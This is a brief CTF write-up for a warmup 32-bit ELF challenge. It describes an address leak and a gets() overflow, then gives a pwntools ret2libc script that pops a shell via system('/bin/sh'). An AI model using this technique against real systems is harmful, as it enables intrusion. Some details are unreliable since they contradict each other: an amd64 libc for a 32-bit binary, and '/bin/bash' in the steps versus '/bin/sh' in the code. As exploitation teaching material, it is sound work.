
![task](images/1.jpg)
### Information
It was a warmup challenge, 
We were given a 32bit ELF file.
![task](images/2.jpg)
Running the binary, we can see that it's leaking an address, then asking for an input.
![task](images/3.jpg)

While decompiling using IDA, we can see that the program is leaking system address, then reading an input using gets, and as we know , gets is a dangerous function that leads to buffer overflow.

### Exploitation
- Determine libc version (using [libc blucat](https://libc.blukat.me/) as an example)
- Calculate libc base address
- find /bin/bash address
- system("/bin/bash")
```python
from pwn import *
libc = ELF('libc6_2.30-0ubuntu2_amd64.so')
p = process("./molotov")
system = int("0x"+p.recvline().rstrip("\n"),16)
base = system - libc.symbols['system']
binsh = base + libc.search("/bin/sh").next()
log.warn("base = "+hex(base))
payload = ""
payload += "A"*32
payload += p32(system)
payload += "JUNK"
payload += p32(binsh)
p.sendline(payload)
p.interactive()
```
